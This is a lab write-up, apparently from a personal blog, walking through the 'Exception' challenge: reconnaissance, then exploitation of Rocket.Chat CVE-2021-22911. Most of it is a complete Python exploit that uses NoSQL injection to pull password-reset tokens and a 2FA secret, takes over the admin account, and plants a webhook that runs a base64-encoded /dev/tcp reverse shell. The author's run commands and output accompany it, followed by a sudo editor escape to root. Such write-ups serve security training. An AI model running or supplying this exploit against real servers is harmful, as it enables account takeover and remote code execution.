---
title: Exception Writeup - Hack Smarter Lab
description: NoSQL Injection to RCE via Rocket.Chat CVE-2021-22911
author: drewbyte
date: 2026-04-17 00:00:00 +0800
categories: [writeup, lab]
tags: [writeup, lab]
pin: true
image:
  path: /assets/img/exception.png
  alt: img
---

> **Description**
{: .box-danger }

A walkthrough of the Exception lab challenge, where an exposed Rocket.Chat instance is exploited through a NoSQL injection vulnerability (CVE-2021-22911) to achieve remote code execution. This write-up covers reconnaissance with Nmap, service discovery, abuse of password reset functionality, token extraction via injection, and privilege escalation to root.

---

### Reconnaissance

I saw that there were 2 open ports on the target, which are SSH and HTTP.

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -A -sC -sV -p- 10.1.228.158 -T4
```

So I navigated to the HTTP service and explored the target.

![exception](/assets/img/exception1.png){: .mx-auto .shadow .rounded-10 w="800" }

I checked the source code and found something interesting.

![exception](/assets/img/exception2.png){: .mx-auto .shadow .rounded-10 w="800" }

There might be a logic flow here that I need to check.

![exception](/assets/img/exception3.png){: .mx-auto .shadow .rounded-10 w="800" }

It looks like a red herring, so I decided to run another Nmap scan.

The command I used for scanning is below:

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -A -sC -sV -p- 10.1.228.158 -T4
```

Now I will visit the target on port 3000, and I found a Rocket.Chat instance.

---

### Initial Access

I registered a low-privileged account on the Rocket.Chat instance with the credentials `drewbyte-1:password` to enumerate from within.

Inside the general channel, I found a user named `localh0ste` who had leaked their email address in chat.

![exception](/assets/img/exception5.png){: .mx-auto .shadow .rounded-10 w="800" }

``localh0ste@exception.local``

While browsing, I intercepted requests with **Burp Suite** and noticed API calls in the background. I checked the version endpoint.

![exception](/assets/img/exception6.png){: .mx-auto .shadow .rounded-10 w="800" }

I saw that there was an API running in the background, so I checked the version.

![exception](/assets/img/exception7.png){: .mx-auto .shadow .rounded-10 w="800" }

After checking the version of Rocket.Chat, I found that it is vulnerable to NoSQL injection leading to RCE.

![exception](/assets/img/exception8.png){: .mx-auto .shadow .rounded-10 w="800" }

---

### Exploitation

After confirming the vulnerability and getting the Exploit-DB ID, I downloaded it using searchsploit.

I then used the exploit with the following command:

```bash
┌──(kali㉿kali)-[~]
└─$ python3 50108.py \
  -u test@exception.local \
  -a localh0ste@exception.local \
  -t http://10.1.228.158:3000
```
While doing this and waiting for the password reset, I set up a listener.

![exception](/assets/img/exception9.png){: .mx-auto .shadow .rounded-10 w="800" }

The script took too long, which caused the token to expire.

![exception](/assets/img/exception12.png){: .mx-auto .shadow .rounded-10 w="800" }

### Exploit Modification

I tried to modify the code with the help of AI.

Here is the script :P

```python
# Title: Rocket.Chat 3.12.1 - NoSQL Injection to RCE (Unauthenticated) (2)
# Author: enox
# Date: 06-06-2021
# Product: Rocket.Chat
# Vendor: https://rocket.chat/
# Vulnerable Version(s): Rocket.Chat 3.12.1 (2)
# CVE: CVE-2021-22911
# Credits: https://blog.sonarsource.com/nosql-injections-in-rocket-chat

#!/usr/bin/python

import requests
import string
import time
import hashlib
import json
import oathtool
import argparse
import base64

parser = argparse.ArgumentParser(description='RocketChat 3.12.1 RCE')
parser.add_argument('-u', help='Low priv user email [ No 2fa ]', required=True)
parser.add_argument('-U', help='Low priv username [ No 2fa ]', required=True)
parser.add_argument('-p', help='Low priv user password [ No 2fa ]', required=True)
parser.add_argument('-a', help='Administrator email', required=True)
parser.add_argument('-A', help='Administrator username', required=True)
parser.add_argument('-t', help='URL (Eg: http://rocketchat.local)', required=True)
parser.add_argument('-H', help='reverse shell host', required=True)
parser.add_argument('-P', help='reverse shell port', required=True)

args = parser.parse_args()

adminmail = args.a
lowprivmail = args.u
lowprivuser = args.U
lowprivpassword = args.p
target = args.t
privuser = args.A
revip = args.H
revport = args.P


def forgotpassword(email, url):
    payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"sendForgotPasswordEmail\\",\\"params\\":[\\"'+email+'\\"]}"}'
    headers = {'content-type': 'application/json'}
    r = requests.post(url+"/api/v1/method.callAnon/sendForgotPasswordEmail", data=payload, headers=headers, verify=False, allow_redirects=False)
    print("[+] Password Reset Email Sent")


def resettoken(url):
    u = url+"/api/v1/method.callAnon/getPasswordPolicy"
    headers = {'content-type': 'application/json'}
    token = ""

    num = list(range(0, 10))
    string_ints = [str(int) for int in num]
    characters = list(string.ascii_uppercase + string.ascii_lowercase) + list('-') + list('_') + string_ints

    while len(token) != 43:
        for c in characters:
            payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"getPasswordPolicy\\",\\"params\\":[{\\"token\\":{\\"$regex\\":\\"^%s\\"}}]}"}' % (token + c)
            r = requests.post(u, data=payload, headers=headers, verify=False, allow_redirects=False)
            time.sleep(0.5)
            if 'Meteor.Error' not in r.text:
                token += c
                print(f"Got: {token}")

    print(f"[+] Got token : {token}")
    return token


def changingpassword(url, token):
    payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"P@$$w0rd!1234\\"]}"}'
    headers = {'content-type': 'application/json'}
    r = requests.post(url+"/api/v1/method.callAnon/resetPassword", data=payload, headers=headers, verify=False, allow_redirects=False)
    if "error" in r.text:
        exit("[-] Wrong token")
    print("[+] Password was changed !")


def twofactor(url, user, password, privuser):
    # Authenticating
    sha256pass = hashlib.sha256(password.encode()).hexdigest()
    payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"username\\":\\"'+user+'\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
    headers = {'content-type': 'application/json'}
    r = requests.post(url + "/api/v1/method.callAnon/login", data=payload, headers=headers, verify=False, allow_redirects=False)
    if "error" in r.text:
        exit("[-] Couldn't authenticate")
    data = json.loads(r.text)
    data = (data['message'])
    userid = data[32:49]
    token = data[60:103]
    print(f"[+] Successfully authenticated as {user}")

    # Getting 2fa secret
    cookies = {'rc_uid': userid, 'rc_token': token}
    headers = {'X-User-Id': userid, 'X-Auth-Token': token}
    payload = '/api/v1/users.list?query={"$where"%3a"this.username%3d%3d%3d\''+privuser+'\'+%26%26+(()%3d>{+throw+this.services.totp.secret+})()"}'
    r = requests.get(url+payload, cookies=cookies, headers=headers)
    code = r.text[46:98]
    print(f"Got the code for 2fa: {code}")
    return code


def admin_token(url, user, password, privuser):
    # Authenticating
    sha256pass = hashlib.sha256(password.encode()).hexdigest()
    payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"username\\":\\"'+user+'\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
    headers = {'content-type': 'application/json'}
    r = requests.post(url + "/api/v1/method.callAnon/login", data=payload, headers=headers, verify=False, allow_redirects=False)
    if "error" in r.text:
        exit("[-] Couldn't authenticate")
    data = json.loads(r.text)
    data = (data['message'])
    userid = data[32:49]
    token = data[60:103]
    print(f"[+] Successfully authenticated as {user}")

    # Getting reset token for admin
    cookies = {'rc_uid': userid, 'rc_token': token}
    headers = {'X-User-Id': userid, 'X-Auth-Token': token}
    payload = '/api/v1/users.list?query={"$where"%3a"this.username%3d%3d%3d\''+privuser+'\'+%26%26+(()%3d>{+throw+this.services.password.reset.token+})()"}'
    r = requests.get(url+payload, cookies=cookies, headers=headers)
    code = r.text[46:89]
    print(f"Got the reset token: {code}")
    return code


def changingadminpassword(url, token, code):
    payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"P@$$w0rd!1234\\",{\\"twoFactorCode\\":\\"'+code+'\\",\\"twoFactorMethod\\":\\"totp\\"}]}"}'
    headers = {'content-type': 'application/json'}
    r = requests.post(url+"/api/v1/method.callAnon/resetPassword", data=payload, headers=headers, verify=False, allow_redirects=False)
    if "403" in r.text:
        exit("[-] Wrong token")
    print("[+] Admin password changed !")


def rce(url, code, cmd, user):
    # Authenticating
    sha256pass = hashlib.sha256(b'P@$$w0rd!1234').hexdigest()
    headers = {'content-type': 'application/json'}
    payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"totp\\":{\\"login\\":{\\"user\\":{\\"username\\":\\"'+user+'\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}},\\"code\\":\\"'+code+'\\"}}]}"}'
    r = requests.post(url + "/api/v1/method.callAnon/login", data=payload, headers=headers, verify=False, allow_redirects=False)
    if "error" in r.text:
        exit("[-] Couldn't authenticate")
    data = json.loads(r.text)
    data = (data['message'])
    userid = data[32:49]
    token = data[60:103]
    print("[+] Successfully authenticated as administrator")

    # Creating Integration
    payload = '{"enabled":true,"channel":"#general","username":"'+user+'","name":"rce","alias":"","avatarUrl":"","emoji":"","scriptEnabled":true,"script":"const require = console.log.constructor(\'return process.mainModule.require\')();\\nconst { exec } = require(\'child_process\');\\nexec(\''+cmd+'\');","type":"webhook-incoming"}'
    cookies = {'rc_uid': userid, 'rc_token': token}
    headers = {'X-User-Id': userid, 'X-Auth-Token': token}
    r = requests.post(url+'/api/v1/integrations.create', cookies=cookies, headers=headers, data=payload)
    data = r.text
    data = data.split(',')
    token = data[12]
    token = token[9:57]
    _id = data[18]
    _id = _id[7:24]

    # Triggering RCE
    u = url + '/hooks/' + _id + '/' + token
    r = requests.get(u)
    print(r.text)


############################################################

# Privilege Escalation to admin
## Getting secret for 2fa
secret = twofactor(target, lowprivuser, lowprivpassword, privuser)

## Sending Reset mail
print(f"[+] Resetting {adminmail} password")
forgotpassword(adminmail, target)

## Getting admin reset token through nosql injection authenticated
token = admin_token(target, lowprivuser, lowprivpassword, privuser)

## Resetting Password
code = oathtool.generate_otp(secret)
changingadminpassword(target, token, code)

## Reverse Shell
rev = '/bin/sh -i >& /dev/tcp/'+revip+'/'+revport+' 0>&1'
encoded_rev = base64.b64encode(rev.encode()).decode()
payload = 'echo ' + encoded_rev + ' | base64 -d | bash'
rce(target, code, payload, privuser)
```

Here how I run the script:
```bash
┌──(kali㉿kali)-[~]
└─$ python3 exploit.py \
  -t http://10.1.228.158:3000 \
  -u drewbyte@drewbyte.com \
  -U drewbyte-1 \
  -p password \
  -a localh0ste@exception.local \
  -A localh0ste \
  -H 10.200.48.178 \
  -P 4446
[+] Successfully authenticated as drewbyte-1
Got the code for 2fa: KIYTUQZKO4YD6ZJYEUWFAMB4OBAU6I3RJBCXMP3UGJHEOOBJGNLQ
[+] Resetting localh0ste@exception.local password
[+] Password Reset Email Sent
[+] Successfully authenticated as drewbyte-1
Got the reset token: 56GFN6WvQckZbg2LHIlHQrE3wknNAV_XGa7pQ1g6EMA
[+] Admin password changed !
[+] Successfully authenticated as administrator
{"success":false}
```

After that, I converted the 2FA secret into a numeric code using oathtool:

```bash
┌──(kali㉿kali)-[~]
└─$ echo "KIYTUQZKO4YD6ZJYEUWFAMB4OBAU6I3RJBCXMP3UGJHEOOBJGNLQ" | oathtool --totp -b -
915594
```

![exception](/assets/img/exception13.png){: .mx-auto .shadow .rounded-10 w="800" }

After getting the 2FA code, I tried to log in with it, and it worked.

![exception](/assets/img/exception14.png){: .mx-auto .shadow .rounded-10 w="800" }

### Remote Code Execution

After investigating the admin panel, I checked the integrations section and found two RCE-related entries - It seems it's because I ran 2 times the script.

![exception](/assets/img/exception15.png){: .mx-auto .shadow .rounded-10 w="800" }

There was a webhook URL created by the script. I converted the base64 payload to a text file.

![exception](/assets/img/exception16.png){: .mx-auto .shadow .rounded-10 w="800" }

And yes, it came from the script that was generated earlier.

![exception](/assets/img/exception17.png){: .mx-auto .shadow .rounded-10 w="800" }

To trigger it, I saved it first and used curl on the webhook:

``http://ip:3000/hooks/token``

But before that, I created a listener on port 4446.

![exception](/assets/img/exception19.png){: .mx-auto .shadow .rounded-10 w="800" }

After triggering it, I got a shell.

I checked the home directory and saw only one user, which is node.

![exception](/assets/img/exception20.png){: .mx-auto .shadow .rounded-10 w="800" }

### Foothold

I didn’t find anything interesting at first, so I continued enumerating for credentials that I could use for SSH login.

![exception](/assets/img/exception21.png){: .mx-auto .shadow .rounded-10 w="800" }

There was a file named Backup_db.txt in the home directory, and I found credentials inside it. I tried using them for SSH, and it worked.

![exception](/assets/img/exception22.png){: .mx-auto .shadow .rounded-10 w="800" }

### Privilege Escalation

For root privilege escalation, I found something interesting after running:

``sudo -l``

![exception](/assets/img/exception23.png){: .mx-auto .shadow .rounded-10 w="800" }

I tried running the command:

``sudo /opt/log_inspector/check_log --clean``

After that, I pressed:

```
CTRL+R
CTRL+X
```

![exception](/assets/img/exception24.png){: .mx-auto .shadow .rounded-10 w="800" }

Then I inserted the following command:

reset; sh 1>&0 2>&0

![exception](/assets/img/exception25.png){: .mx-auto .shadow .rounded-10 w="800" }

And it worked!

![exception](/assets/img/exception26.png){: .mx-auto .shadow .rounded-10 w="800" }